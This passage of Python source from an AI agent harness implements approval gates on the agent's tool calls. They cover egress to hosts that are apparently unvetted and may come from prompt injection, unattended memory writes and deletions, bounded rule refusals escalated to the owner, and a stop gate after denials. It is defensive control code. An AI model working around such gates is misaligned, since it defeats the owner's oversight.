        None when the call needs no gate (user-origin session, non-egress
        tool, or every host already in provenance). Provenance = hosts from
        owner-authored text (_owner_hosts) + hosts approved on an earlier
        egress card (_approved_hosts) — hosts that first appeared in tool
        results or fetched pages deliberately do NOT qualify, since those are
        exactly what an injected instruction controls."""
        if self.origin == "user" or name not in EGRESS_TOOLS:
            return None
        if name in ("read_url", "show_image"):
            url = str(args.get("url") or args.get("source") or "")
            # show_image also takes a local path, which leaves the machine not
            # at all — nothing to gate. Anything http(s)-shaped is an egress.
            if name == "show_image" and not url.lower().startswith(("http://", "https://")):
                return None
            try:
                host = (urllib.parse.urlsplit(url).hostname or "").lower()
            except ValueError:
                host = ""
            if not host:
                return [url.strip() or "(no url)"]  # unparseable → fail closed
            hosts = {host}
        else:  # web_search: the query itself is the outbound payload; gate on
            # any host/URL it names (a host-free query names no novel host).
            hosts = _hosts_in_text(str(args.get("query", "")))
        known = self._owner_hosts | self._approved_hosts
        novel = sorted(h for h in hosts if h not in known)
        return novel or None

    def _egress_gate(self, name: str, args: dict) -> str | None:
        """Approval gate for outbound reads in a triggered session (#178
        P0-2): None = proceed, else the refusal/hold text for the model. Runs
        through the same approve_tool channel (and Bridge.ask path) as
        mutating plugin tools, so the card, the audit record, and the
        no-viewer push notification all come for free; verdict semantics
        mirror _dispatch_plugin_tool (#81) exactly."""
        novel = self._egress_novel_hosts(name, args)
        if novel is None:
            return None
        shown = ", ".join(novel)
        if self.approve_tool is None:
            return _gate_outcome(EGRESS_NO_APPROVER.format(host=shown), decision="blocked")
        preview = (
            f"automated session wants to reach {shown} — a host not "
            "mentioned by the owner in this conversation"
        )
        decision = self.approve_tool(name, args, preview)
        if isinstance(decision, Denied):
            self._arm_stop_gate(decision.comment)
            return _gate_outcome(
                _with_feedback(EGRESS_DENIED, decision.comment), decision="denied"
            )
        if isinstance(decision, Approved):
            return _gate_outcome(
                TOOL_HELD_FOR_ADJUSTMENT.format(name=name, comment=decision.comment),
                decision="held",
            )
        if decision is None or decision is False:
            return _gate_outcome(EGRESS_DENIED, decision="denied")
        # Plain approve: the owner vouched for these hosts for the rest of
        # this session, so the same host does not re-prompt every step.
        self._approved_hosts.update(novel)
        return None

    def _knowledge_gate(self, name: str, args: dict) -> str | None:
        """Gate for remember/forget_memory in a triggered session (#196): None
        = proceed, else the refusal/hold text for the model. An attended
        session returns on the first line, so saving a fact there is
        byte-identical to before — no new prompt, no new path.

        Deletion is refused STRUCTURALLY rather than held on a card: there is
        no unattended case where autonomously deleting the owner's knowledge is
        the answer, so a card would only park the worker on a question already
        decided (the curate pass's intended path is proposing retirement in its
        summary). Saving holds, because a triggered session does legitimately
        learn things and the owner should see what lands in the corpus. Verdict
        semantics mirror _egress_gate / _dispatch_plugin_tool (#81) exactly."""
        if self.origin == "user" or name not in KNOWLEDGE_WRITE_TOOLS:
            return None
        slug = str(args.get("name", "") or "").strip() or "(unnamed)"
        if name == "forget_memory":
            self._note(f"✋ forget_memory refused in a {self.origin} session: {slug}")
            return _gate_outcome(FORGET_PROHIBITED.format(slug=slug), decision="blocked")
        if self.approve_tool is None:
            return _gate_outcome(REMEMBER_NO_APPROVER, decision="blocked")
        preview = (
            f"automated session ({self.origin}) wants to save the memory "
            f"{slug} — a memory persists into every future session and is "
            "retrieved automatically"
        )
        decision = self.approve_tool(name, args, preview)
        if isinstance(decision, Denied):
            self._arm_stop_gate(decision.comment)
            return _gate_outcome(
                _with_feedback(REMEMBER_DENIED, decision.comment), decision="denied"
            )
        if isinstance(decision, Approved):
            return _gate_outcome(
                TOOL_HELD_FOR_ADJUSTMENT.format(name=name, comment=decision.comment),
                decision="held",
            )
        if decision is None or decision is False:
            return _gate_outcome(REMEMBER_DENIED, decision="denied")
        return None

    def note_owner_hosts(self, text: str) -> None:
        """Fold hosts from owner-authored text into egress provenance. Called
        only for text the OWNER supplied (task prompts, mid-task steering,
        shared context) — never for tool results or fetched content."""
        if self.origin != "user":
            self._owner_hosts |= _hosts_in_text(text)

    def _read_prompt_reason(self, path: str) -> str | None:
        """Why an otherwise auto-approved read_file must prompt, or None."""
        if files.is_sensitive_path(path, self.cwd):
            return "sensitive"
        if files.is_outside_roots(path, self.cwd, self.roots):
            return "outside"
        return None

    @staticmethod
    def _int_arg(args: dict, key: str, default: int) -> int:
        try:
            return int(args.get(key) or default)
        except (TypeError, ValueError):
            return default

    def _read_file_call(self, args: dict) -> tuple[str, Callable[[], str]]:
        path = str(args.get("path", ""))
        offset = self._int_arg(args, "offset", 1)
        limit = self._int_arg(args, "limit", files.READ_MAX_LINES)
        label = f"→ read_file: {path}" + (f" (from line {offset})" if offset > 1 else "")
        return label, partial(files.read_file, path, self.cwd, offset=offset, limit=limit)

    def _record_admission(self, record: dict) -> None:
        """The `admission` record (contract §3.7) for the near-duplicate gate.
        Renderless. #194 will add the fact-vs-behaviour classification to the
        same kind; this phase contributes the half that already exists and was
        deciding silently — including the SCORE and the FLOOR, without which
        DEDUP_MIN_SIM stays "provisional until measured" forever."""
        self._emit_record(kind="admission", target="memory", **record)

    # ------------------------------------------------------------ rules (#191)

    def seed_rules(self, task: str) -> str:
        """Evaluate the rule corpus against this turn and create the bindings.

        The ONE seed point, called by both entry points (run_task, and
        ClaudeMaxAgent.run_task whose SDK owns its own loop) so a rule governs a
        claude-max turn exactly as it governs a local one. Returns the prose the
        model is shown; the caller decides where to put it, and tells us whether
        it landed via `mark_rules_seeded`.

        Emits `rule_eval` unconditionally — including for an empty corpus. That
        looks like noise and is not: "no rule was evaluated for this turn" is a
        different answer from "a rule was evaluated and abstained", and the two
        route to different repairs (contract §3.1, fork 8).
        """
        corpus = rules.load_rules()
        active, skipped = rules.partition(corpus)
        known = self._known_tool_names()
        rows: list[dict] = []
        for rule in active:
            started = time.perf_counter()
            try:
                verdict, evidence = rules.evaluate(rule, self._turn_context(task))
            except Exception as exc:  # noqa: BLE001 — a broken evaluator must not kill the turn
                verdict, evidence = rules.VERDICT_UNEVALUABLE, {"error": repr(exc)[:200]}
            row: dict = {
                "rule": rule.name,
                "trigger": rule.trigger,
                "tier": rule.tier,
                "verdict": verdict,
                "evidence": evidence,
                "ms": round((time.perf_counter() - started) * 1000, 3),
            }
            binding = None
            if verdict == rules.VERDICT_BIND:
                binding = rules.bind(rule, evidence, f"b{next(self._binding_seq)}", known)
            elif verdict == rules.VERDICT_UNEVALUABLE:
                # Failure direction is per enforcement point AND declared per
                # rule. `open` = do not bind (the owner is watching); `hold` =
                # bind conservatively AND send the first violation straight to
                # the owner, since the harness could not confirm the trigger and
                # must not decide the exception itself. Restriction is the safe
                # direction: a rule-engine bug may OVER-restrict (loud), never
                # under-restrict (silent).
                row["fail"] = rule.fail
                if rule.fail == rules.FAIL_HOLD:
                    binding = rules.bind(
                        rule, evidence, f"b{next(self._binding_seq)}", known, max_rounds=0
                    )
            if binding is not None:
                row["binding"] = binding.id
                self._bindings.append(binding)
            rows.append(row)
        self._emit_record(**rules.eval_record(active, skipped, rows))
        if not self._bindings:
            return ""
        for binding in self._bindings:
            self._note(f"⚖ rule in force: {binding.name}")
        return rules.seed_text(self._bindings)

    def mark_rules_seeded(self) -> None:
        """The binding record is written only once the PROSE has reached the
        model's context. `seeded` is what makes "refused by a gate it was never
        told about" — an enforcement-point bug — detectable in the log rather
        than only in a diff (contract §3.2)."""
        for binding in self._bindings:
            binding.seeded = True
            self._emit_record(**rules.binding_record(binding))

    def _turn_context(self, task: str) -> rules.TurnContext:
        """The facts Tier-0 triggers read. Gathered by the HARNESS — never the
        acting model's summary of its own turn (contract corollary 3)."""
        return rules.TurnContext(task=task, origin=self.origin)

    def _known_tool_names(self) -> set[str]:
        """Everything the model can call this turn, for the bind-time
        unsatisfiability check: a route to a tool that no longer exists must
        surface when it fires, not months later."""
        self._refresh_plugin_tools()
        names = set()
        for schema in [*tools.TOOL_SCHEMAS, *self._plugin_defs]:
            function: dict = schema["function"]
            names.add(str(function["name"]))
        return names

    def _observe_for_rules(self, name: str, result: str) -> None:
        """Feed a completed tool call back into the bindings.

        The routed tool's #192 envelope status is what makes `disclose`
        reachable: an `incomplete` route is the failure the owner must be told
        about before another source may be used. A REFUSED call never counts —
        the action did not happen, so it cannot satisfy a route.
        """
        if not self._bindings:
            return
        meta = getattr(result, "meta", None) or {}
        if meta.get("decision") in REFUSED_DECISIONS:
            return
        status = meta.get("status")
        if status is None:
            status = (
                tools.STATUS_FAILED
                if result.startswith(("ERROR", "NOT EXECUTED"))
                else tools.STATUS_OK
            )
        for binding in self._bindings:
            binding.note_tool_result(name, status)

    def note_model_text(self, text: str) -> None:
        """Assistant prose emitted ALONGSIDE tool calls — the only place a
        mid-task disclosure can live, since a text-only turn ends the task."""
        for binding in self._bindings:
            binding.note_assistant_text(text)

    def _rule_gate(self, name: str, args: dict) -> str | None:
        """Membership against this turn's bindings: None = proceed, else the
        refusal text. Runs AFTER the stop and skill gates and never in place of
        anything — the engine slots in ALONGSIDE the existing gates, so a rule
        can only ever add a restriction, never lift one.

        Bounded refuse-first: compliance with route/prohibit is within the
        model's power, so it is refused rather than escalated — but only
        RULE_MAX_REFUSALS times, because a gate that refuses forever wedges a
        small model into a stall-out. The next violation is the model's
        insistence, and insistence is its appeal: it goes to the owner.
        """
        if not self._bindings:
            return None
        recorded: set[str] = set()
        # One pass per binding at most: an escalation either refuses (returns)
        # or marks that binding overridden, so it can never escalate twice. The
        # re-pass matters — an owner exception to ONE rule must not silently
        # release a call a SECOND rule also forbids (union of restrictions).
        for _ in range(len(self._bindings) + 1):
            refusal: str | None = None
            stopped = False
            for verdict in rules.gate(self._bindings, name):
                if verdict.verdict == "allowed":
                    if verdict.binding.id not in recorded:
                        recorded.add(verdict.binding.id)
                        self._record_gate(verdict, name, args, "allowed")
                    continue
                stopped = True
                if verdict.verdict == "refused":
                    self._note(f"⚖ {verdict.binding.name}: {name} refused")
                    self._record_gate(verdict, name, args, "refused")
                    refusal = _gate_outcome(verdict.message, decision="blocked")
                else:
                    refusal = self._escalate_rule(verdict, name, args)
                    # The escalation already wrote this binding's verdict for
                    # this call. Without this the re-pass writes a SECOND
                    # `allowed` row for the same (call, binding) and a per-gate
                    # tally counts one allowance twice.
                    recorded.add(verdict.binding.id)
            if refusal is not None:
                if name == "run_command":  # so the trace shows why, not a bare row
                    self._run_meta = {
                        "command": str(args.get("command", "")),
                        "decision": "blocked",
                        "output": str(refusal),
                    }
                return refusal
            if not stopped:
                return None
        return None

    def _escalate_rule(
        self, verdict: "rules.GateVerdict", name: str, args: dict
    ) -> str | None:
        """Tier 3 — the owner. Reached only after the bounded refusals, so the
        card carries a model that has insisted rather than one that mistyped.
        There may be legitimate exceptions; only the owner can grant one, and
        an override is per-TURN and recorded, because a rule overridden every
        time it fires is a wrong rule (#191's lifecycle signal).

        Returns the refusal text, or None when the owner granted the exception.
        """
        binding = verdict.binding
        if self.approve_tool is None:
            # Unattended: no one to grant the exception, so the refusal becomes
            # final and says so. Fails to RESTRICTION, and the model is told to
            # stop retrying and report — never left looping into the stall cap.
            message = rules.ESCALATION_REFUSAL.format(rule=binding.name, tool=name)
            self._record_gate(verdict, name, args, "refused", escalated=True, message=message)
            return _gate_outcome(message, decision="blocked")
        preview = (
            f"the rule '{binding.name}' forbids {name} for this turn "
            f"({binding.rule.description}) — the model has insisted after "
            f"{binding.rounds - 1} refusals"
        )
        decision = self.approve_tool(name, args, preview)
        if isinstance(decision, Denied):
            self._arm_stop_gate(decision.comment)
            message = _with_feedback(
                rules.OWNER_DENIED.format(rule=binding.name, tool=name), decision.comment
            )
            self._record_gate(verdict, name, args, "refused", escalated=True, message=message)
            return _gate_outcome(message, decision="denied")
        if isinstance(decision, Approved):
            message = TOOL_HELD_FOR_ADJUSTMENT.format(name=name, comment=decision.comment)
            self._record_gate(verdict, name, args, "held", escalated=True, message=message)
            return _gate_outcome(message, decision="held")
        if decision is None or decision is False:
            message = rules.OWNER_DENIED.format(rule=binding.name, tool=name)
            self._record_gate(verdict, name, args, "refused", escalated=True, message=message)
            return _gate_outcome(message, decision="denied")
        binding.overridden = True
        self._record_gate(
            verdict, name, args, "allowed", escalated=True, message="owner allowed the exception"
        )
        return None

    def _record_gate(
        self,
        verdict: "rules.GateVerdict",
        name: str,
        args: dict,
        outcome: str,
        escalated: bool = False,
        message: str | None = None,
    ) -> None:
        """The §3.3 `gate` record — ONE shape for every gate in the system, so
        #197 and the ledger have one reader. Emitted whenever the gate is ARMED
        (a binding is active), including for the calls it ALLOWED: an armed gate
        that stayed silent is indistinguishable from a disarmed one otherwise,
        and abstentions are decisions (§5)."""
        binding = verdict.binding
        record = {
            "kind": "gate",
            "call": self._current_call(),
            "at": "gate",
            "gate": "rule.prohibit" if verdict.evidence.get("obligation") else "rule",
            "binding": binding.id,
            "rule": binding.name,
            "tool": name,
            "action": rules.cap_action(args),
            "verdict": outcome,
            "tier": binding.rule.tier,
            "evidence": verdict.evidence,
            "round": verdict.round,
            "max_rounds": binding.max_rounds,
            "escalated": escalated,
        }
        text = verdict.message if message is None else message
        if text:
            record["message"] = text[: rules.GATE_MESSAGE_CHARS]
        self._emit_record(**record)

    def _current_call(self) -> int:
        return getattr(self._call_ids, "current", 0)

    def _arm_stop_gate(self, comment: str) -> None:
        """A DENY carried a concern — stop: hold every further tool call until
        the model addresses it in plain text (issue #81). No-op for a bare
        denial, matching the note that only fires on a comment. Approvals never
        arm this — they mean continue (the command is held for adjustment,
        re-proposed, and approved again)."""
        if comment:
            self._pending_comment_response = True

    def _stop_gate(self, name: str, args: dict) -> str | None:
        """Refusal while a denial's concern is unaddressed, else None.

        A Denied comment arms this (see _dispatch/_dispatch_write); the main
        loop clears the flag only when a turn is TEXT-ONLY (no tool call), so a
        genuine reply — not chatty preamble riding alongside a command — lifts
        it, and that text-only turn ends the task (deny means stop). Until then
        every tool call is refused. No countdown: the flag survives across gated
        turns, and the step budget bounds a model that never replies."""
        if not self._pending_comment_response:
            return None
        if name == "run_command":  # so the trace shows why it was held, not a bare row
            self._run_meta = {
                "command": str(args.get("command", "")),
                "decision": "blocked",
                "output": "Held until you address the user's concern.",
            }
        self._note("✋ stopped until you address the user's concern")
        return STOP_GATE_REFUSAL

    def _skill_gate(self, name: str, args: dict) -> str | None:
        """Refusal text while a flagged oversized skill is unread, else None.

        read_skill/recall targeting a flagged skill lifts its gate; any other
        call decrements every counter so a model that ignores the directive
        (or states why the skill does not apply and retries) is only held for
        GATE_MAX_REFUSALS rounds — enforcement, not a wedge."""
        if not self._pending_skill_reads:
            return None
        target = str(args.get("name", "") or "")
        if name in ("read_skill", "recall") and target in self._pending_skill_reads:
            del self._pending_skill_reads[target]
            return None
        names = ", ".join(self._pending_skill_reads)
        first = next(iter(self._pending_skill_reads))
        for key in list(self._pending_skill_reads):
            self._pending_skill_reads[key] -= 1
            if self._pending_skill_reads[key] <= 0:
                del self._pending_skill_reads[key]
        self._note(f"✋ gated until read_skill: {names}")
        return SKILL_GATE_REFUSAL.format(names=names, first=first)

    def _dispatch(self, name: str, args: dict) -> str:
        # The gates run before everything — a refusal must never reach an
        # approval prompt or a tool implementation. The stop gate goes first: a
        # denial's concern outranks every other rule and must be addressed
        # before any tool runs.
        refusal = self._stop_gate(name, args)
        if refusal is not None:
            return refusal

        refusal = self._skill_gate(name, args)
        if refusal is not None:
            if name == "run_command":  # so the trace shows why it was held, not a bare row
                self._run_meta = {
                    "command": str(args.get("command", "")),
                    "decision": "blocked",
                    "output": "Held until the required skill is read.",
                }
            return refusal

        # This turn's rule bindings (#191). ALONGSIDE the gates above and the
        # ones below, never instead of them: a rule can only add a restriction,
        # so a rule-engine bug over-restricts (loud, visible) and can never
        # under-restrict (silent, dangerous).
        refusal = self._rule_gate(name, args)
        if refusal is not None:
            return refusal

        if name == "read_file":
            path = str(args.get("path", ""))
            label, thunk = self._read_file_call(args)
            self._note(label)
            reason = self._read_prompt_reason(path)
            if reason is not None and not self.approve_read(path, reason):
                return _gate_outcome(READ_DENIED, decision="denied")
            return thunk()

        if name in READ_ONLY_TOOLS:
            # Outbound reads in a triggered session hold for approval when
            # they reach beyond the owner's own hosts (#178 P0-2).
            refusal = self._egress_gate(name, args)
            if refusal is not None:
                return refusal
            label, thunk = self._read_only_call(name, args)
            self._note(label)
            self.status.start(name)
            try:
                return thunk()
            finally:
                self.status.stop()

        # Knowledge writes auto-approve only while a human is watching (#196):
        # unattended, deletion is refused and a save holds for review.
        refusal = self._knowledge_gate(name, args)
        if refusal is not None:
            return refusal

        if name == "remember":
            note = str(args.get("note", ""))
            pinned = args.get("pinned")
            disabled = args.get("disabled")
            result = skills.save_memory(
                note,
                skills.GLOBAL_MEMORY_DIR,
                name=str(args.get("name", "") or ""),
                keywords=str(args.get("keywords", "") or ""),
                cwd=self.cwd,
                lessons_path=self.lessons_path,
                expires=str(args.get("expires", "") or "") or None,
                pinned=None if pinned is None else bool(pinned),
                force=bool(args.get("force", False)),
                semantic=self.semantic.scores if self.semantic is not None else None,
                disabled=None if disabled is None else bool(disabled),
                on_admission=self._record_admission,
            )
            self._note(f"→ {result}")
            if result.startswith("NOT saved"):
                # The near-duplicate gate refusing (#178 P1-8). Its message
                # starts with "NOT saved", which the legacy prefix sniff read as
                # a SUCCESS — a refusal logged green, in the one gate #190's
                # evidence shows actually working (contract §6.7).
                return _gate_outcome(result, decision="rejected")
            return result

        if name == "forget_memory":
            # Auto-approved like remember in an ATTENDED session: strictly
            # confined to the model's own memory files (slug-validated, one fact
            # each) and recoverable from the knowledge git backup, so the
            # create/update inverse stays frictionless rather than inventing a
            # new approval channel. Unattended it never gets here (#196).
            result = skills.forget_memory(str(args.get("name", "") or ""), cwd=self.cwd)
            self._note(f"→ {result}")
            return result

        if name in ("write_file", "edit_file"):
            return self._dispatch_write(name, args)

        if name == "create_tool":
            return self._create_tool(args)

        if name == "import_skill":
            return self._import_skill(args)

        if name == "run_command":
            # Expand any aish alias on the first word BEFORE the gate, so the
            # denylist/approval/cd-check all classify the real command.
            command = self.expand_alias(str(args.get("command", "")))

            # Stateless execution: a bare model-issued cd never runs — it
            # would silently detach the model from the project directory, its
            # one stable anchor across long conversations and context trims.
            # Excursions are per-command subshells (cd x && ...), which revert
            # on exit; only the user moves the project (/cd, !cd).
            if self._parse_cd(command) is not None:
                result = CD_NOT_STICKY.format(cwd=self.cwd)
                self._note(result)
                self._run_meta = {"command": command, "decision": "rejected", "output": result}
                return result

            # Auto-approve a delete confined strictly to the scratch workspace
            # (issue #70): rm inside the ephemeral scratch dir is throwaway
            # cleanup, so it skips the prompt. is_scratch_delete fails closed —
            # anything ambiguous or escaping falls through to self.approve, so
            # the denylist and prompt still guard every other rm.
            if is_scratch_delete(command, self.cwd, self.scratch_dir):
                decision: Any = command
            else:
                decision = self.approve(command)
            if isinstance(decision, Blocked):
                self._run_meta = {
                    "command": command, "decision": "blocked", "output": decision.reason,
                }
                return BLOCKED_RESULT.format(reason=decision.reason)
            if isinstance(decision, Denied):
                # Deny + comment = STOP: address the concern, then halt. The stop
                # gate holds every tool until a text-only reply, which ends the
                # task so the user can steer before anything else runs.
                self._run_meta = {
                    "command": command, "decision": "denied", "output": decision.comment or "",
                }
                self._arm_stop_gate(decision.comment)
                return _with_feedback(DENIED_RESULT, decision.comment)
            if isinstance(decision, Approved):
                # Approve + comment = CONTINUE, but adjust: the original command
                # is NOT run as-is. Hold it — the model adjusts to what the user
                # asked and re-proposes, and that adjusted command is approved
                # again before it runs (issue #81). Approval never stops the task.
                self._run_meta = {
                    "command": command, "decision": "held", "output": decision.comment,
                }
                return HELD_FOR_ADJUSTMENT.format(comment=decision.comment)
            if decision is None or decision is False:
                self._run_meta = {"command": command, "decision": "denied", "output": ""}
                return DENIED_RESULT
            final = command if decision is True else str(decision)
            # command_start opens the bounded terminal block in the web UI:
            # cwd + the (possibly edited) command that is about to run.
            self._emit_command_start(final)
            if args.get("background"):
                result = tools.start_background(final, cwd=self.cwd, log_dir=self.job_log_dir)
                self._note(result)
                self._run_meta = {"command": final, "decision": "approved", "output": result}
                # A detached job has no exit code — label the block instead.
                self._emit_command_end(status="detached", job=_parse_job_id(result))
                return result
            result = tools.run_command(
                final,
                cwd=self.cwd,
                on_line=self.stream,
                allow_detach=True,
                log_dir=self.job_log_dir,
                should_stop=self._cancel.is_set,
            )
            self._run_meta = {"command": final, "decision": "approved", "output": result}
            # command_end closes the block: a user cancel has no clean exit
            # code, a failed-to-start command none at all; otherwise the code.
            if self._cancel.is_set():
                self._emit_command_end(status="interrupted")
            else:
                code = _parse_exit_code(result)
                self._emit_command_end(status="exit", exit_code=code)
            if self.stream is None:
                self.echo(result)
            if final != command:
                result = f"[user edited the command to: {final}]\n{result}"
            # Drift nudge (#140): the model ran a raw command a reliable plugin
            # tool already covers — point it at the tool for next time. Advisory
            # only; the command still ran.
            covered = self._tool_for_command(command)
            if covered is not None:
                self._note(f"↩ prefer tool '{covered}' over raw command")
                result += (
                    f"\n\n[aish: the '{covered}' tool covers this operation and passes "
                    "arguments safely (no shell quoting) — prefer calling it over "
                    "composing this command by hand next time.]"
                )
            return result

        tool = self._plugin_tools.get(name)
        if tool is not None:
            return self._dispatch_plugin_tool(tool, args)

        return f"ERROR: unknown tool '{name}'"

    def _refresh_plugin_tools(self) -> None:
        """Rescan TOOL.md manifests when the tool dirs' signature changed
        (mtime-cached, near-free). Read-only tools are always exposed; mutating
        ones are exposed only when a tool approver is wired (else kept for
        fail-closed dispatch but not offered). Invalid manifests are skipped
        and warned about once each."""
        sig = tool_plugins.signature(self.cwd)
        if sig == self._plugin_sig:
            return
        self._plugin_sig = sig
        found, warnings = tool_plugins.discover(self.cwd)
        self._plugin_tools = {t.name: t for t in found}
        gated_ok = self.approve_tool is not None
        exposed = [t for t in found if not t.mutating or gated_ok]
        self._plugin_defs = [tool_plugins.to_tool_def(t) for t in exposed]
        # Only nudge toward tools the model can actually call. A tool may list
        # several command prefixes it should be preferred over.
        self._tool_prefer = [(p, t.name) for t in exposed for p in t.prefer_over]
        for warning in warnings:
            if warning not in self._plugin_warned:
                self._plugin_warned.add(warning)
                self._note(f"⚠ tool skipped: {warning}")
        # Soft tool budget (#178 item 14): a one-line consolidation nudge when
        # the total exposed count drifts past TOOL_BUDGET. Same dedup as the
        # shadow warnings — once per rescan that changes the message, never
        # per step, and no tool is ever hidden.
        exposed_names = [s["function"]["name"] for s in tools.TOOL_SCHEMAS + self._plugin_defs]
        budget_note = tool_plugins.budget_warning(exposed_names)
        if budget_note is not None and budget_note not in self._plugin_warned:
            self._plugin_warned.add(budget_note)
            self._note(f"⚠ {budget_note}")

    def _tool_for_command(self, command: str) -> str | None:
        """The name of an available plugin tool that declares (via `prefer_over`)
        it should be used instead of this raw command, or None. Nudges the model
        off re-composing a command a reliable tool already covers (issue #140)."""
        cmd = " ".join(command.split())
        for prefix, name in self._tool_prefer:
            p = " ".join(prefix.split())
            if p and (cmd == p or cmd.startswith(p + " ")):
                return name
        return None

    def _dispatch_plugin_tool(self, tool: "tool_plugins.Tool", args: dict) -> str:
        # Args are validated BEFORE the gate, so the user never approves a call
        # that would fail validation anyway, and the error feeds the retry loop.
        problem = tool_plugins.validate_args(tool, args)
        if problem is not None:
            self._note(f"→ {tool.name}: {problem}")
            return tools.ToolOutcome(
                problem,
                status=tools.STATUS_FAILED,
                verdict_by=tools.VERDICT_EXCEPTION,
                error="invalid_args",
            )

        if tool.mutating:
            if self.approve_tool is None:
                # Not exposed without an approver, so this only fires on a stale
                # tool_call — fail closed rather than run a mutation ungated.
                return _gate_outcome(
                    f"ERROR: tool {tool.name!r} is mutating and no tool approver "
                    "is available; it cannot run.",
                    decision="blocked",
                )
            # Resolve args to a human sentence for the card BEFORE gating (#157);
            # None when the tool declares no preview or resolution fails (raw-args
            # fallback). Read-only, so it runs ungated.
            preview_text = tool_plugins.preview(tool, args, self.cwd)
            decision = self.approve_tool(tool.name, args, preview_text)
            if isinstance(decision, Denied):
                # Deny + comment = STOP (issue #81): address the concern, then halt.
                self._arm_stop_gate(decision.comment)
                return _gate_outcome(
                    _with_feedback(DENIED_RESULT, decision.comment), decision="denied"
                )
            if isinstance(decision, Approved):
                # Approve + comment = CONTINUE but adjust: the original args are
                # HELD, the model reworks them and re-proposes (re-approved).
                return _gate_outcome(
                    TOOL_HELD_FOR_ADJUSTMENT.format(
                        name=tool.name, comment=decision.comment
                    ),
                    decision="held",
                )
            if decision is None or decision is False:
                return _gate_outcome(DENIED_RESULT, decision="denied")

        shown = ", ".join(f"{k}={v!r}" for k, v in args.items())
        self._note(f"→ {tool.name}({shown})")
        self.status.start(tool.name)
        try:
            return self._execute_plugin(tool, args)
        finally:
            self.status.stop()

    _WRAPPER_META = {  # lang -> (filename, shebang)
        "sh": ("run.sh", "#!/bin/sh"),
        "python": ("run.py", "#!/usr/bin/env python3"),
    }

    def _create_tool(self, args: dict) -> str:
        """Author a plugin tool (issue #141). Three guardrails the model cannot
        bypass: the WHEN test lives in the tool description (imperative); the
        manifest is LINTED and this refuses to write on any error (structured
        feedback → correct-and-retry); and both files go through the normal
        write-approval gate so the user sees the real code before it exists."""
        name = str(args.get("name", "")).strip()
        if not tool_plugins.NAME_RE.match(name):
            return f"ERROR: invalid tool name {name!r} (need [A-Za-z0-9_-], 1-64)."
        lang = str(args.get("wrapper_lang", "sh") or "sh").strip()
        if lang not in self._WRAPPER_META:
            return f"ERROR: wrapper_lang must be one of {sorted(self._WRAPPER_META)}."
        raw_schema = str(args.get("schema", "") or "{}").strip() or "{}"
        try:
            schema_obj = json.loads(raw_schema)
        except json.JSONDecodeError as exc:
            return f"ERROR: schema is not valid JSON ({exc})."

        wrapper_name, shebang = self._WRAPPER_META[lang]
        wrapper_body = str(args.get("wrapper", ""))
        if not wrapper_body.strip():
            return "ERROR: wrapper (the executable script body) is required."
        if not wrapper_body.startswith("#!"):
            wrapper_body = f"{shebang}\n{wrapper_body}"
        if not wrapper_body.endswith("\n"):
            wrapper_body += "\n"

        mutating = "yes" if args.get("mutating") else "no"
        lines = [
            "---",
            f"name: {name}",
            f"description: {str(args.get('description', '')).strip()}",
            f"exec: ./{wrapper_name}",
            f"mutating: {mutating}",
        ]
        preview = args.get("preview")
        if preview not in (None, "", False):
            # A non-bool goes through verbatim so the lint below rejects a bogus
            # value instead of silently coercing it into a promised preview.
            lines.append(f"preview: {'yes' if preview is True else str(preview).strip()}")
        if args.get("timeout"):
            lines.append(f"timeout: {int(args['timeout'])}")
        if str(args.get("prefer_over", "") or "").strip():
            lines.append(f"prefer_over: {str(args['prefer_over']).strip()}")
        if str(args.get("secrets", "") or "").strip():
            lines.append(f"secrets: {str(args['secrets']).strip()}")
        lines.append(f"schema: {json.dumps(schema_obj)}")
        lines.append("---")
        lines.append(str(args.get("notes", "")).strip() or f"{name} tool.")
        manifest_text = "\n".join(lines) + "\n"

        # Lint against a throwaway copy first — never prompt for an invalid tool.
        with tempfile.TemporaryDirectory(prefix="aish-tool-lint-") as tmp:
            tdir = Path(tmp)
            (tdir / wrapper_name).write_text(wrapper_body, encoding="utf-8")
            os.chmod(tdir / wrapper_name, 0o755)
            (tdir / "TOOL.md").write_text(manifest_text, encoding="utf-8")
            errors = tool_plugins.lint(tdir / "TOOL.md")
        if errors:
            joined = "; ".join(e.split(": ", 1)[-1] for e in errors)
            return (
                f"ERROR: tool {name!r} did not validate: {joined}. "
                "Fix and call create_tool again."
            )

        if self.approve_write is None:
            return "ERROR: no write approver available; cannot create a tool."

        if str(args.get("scope", "global")).strip() == "project":
            if not tool_plugins.INCLUDE_PROJECT_DIRS:
                # #178 P0-1: a tool written to ./.aish/tools would never be
                # discovered — a silent no-op is worse than a refusal.
                return (
                    "ERROR: scope 'project' is unavailable — project-scope tool "
                    "discovery (./.aish/tools) is disabled pending a per-directory "
                    "trust mechanism, so a project tool would never be discovered "
                    "or run. Call create_tool again with scope 'global'."
                )
            base = Path(self.cwd) / ".aish" / "tools" / name
        else:
            base = tool_plugins.GLOBAL_TOOLS_DIR / name

        # Manifest FIRST: the user reasons about the tool's interface (what it
        # does, what args it takes) before its implementation — review intent,
        # then verify the code. Each file is diff-approved; a denial aborts,
        # and an orphan (manifest without wrapper, or vice-versa) is simply
        # skipped at discovery since the linter won't resolve it.
        self._note(f"→ creating tool {name} in {_display_path(base)}")
        manifest_res = self._commit_tool_file(base / "TOOL.md", manifest_text, executable=False)
        if manifest_res is not None:
            return manifest_res
        wrapper_res = self._commit_tool_file(base / wrapper_name, wrapper_body, executable=True)
        if wrapper_res is not None:
            return wrapper_res
        self._plugin_sig = None  # force a rescan so the new tool is offered
        self._note(f"→ created tool {name} at {base}")
        result = f"Created tool {name!r} at {base}. It is available on the next step."
        prefer_over = [
            p.strip() for p in str(args.get("prefer_over", "") or "").split(",") if p.strip()
        ]
        stale = self._reconcile_candidates(
            name, str(args.get("description", "")), prefer_over
        )
        if stale:
            listed = "\n".join(f"- [{e.kind}] {e.name}: {e.description}" for e in stale)
            result += (
                f"\n\nRECONCILE KNOWLEDGE (do this now): {name!r} is now the PREFERRED "
                "way to do this, so any saved skill/memory describing the OLD manual way "
                "must not stay and contradict it. These existing entries look related:\n"
                f"{listed}\n"
                f"For EACH: if it tells you to do this task by hand, UPDATE it to use the "
                f"{name!r} tool instead (edit the skill with edit_file, or remember() the "
                "correction), or forget_memory() it if it is purely the superseded "
                "command. KEEP entries that only add orthogonal context (labels, repo "
                "conventions, IDs). Then say what you changed."
            )
        return result

    def _reconcile_candidates(
        self, name: str, description: str, prefer_over: list[str]
    ) -> list:
        """Skills/memories that may now conflict with a just-created tool (#150):
        ones that mention a command the tool is preferred over, or that share the
        tool's subject words. Detection is deterministic; the model judges which
        actually conflict and reconciles them (gated). Capped, best-effort."""
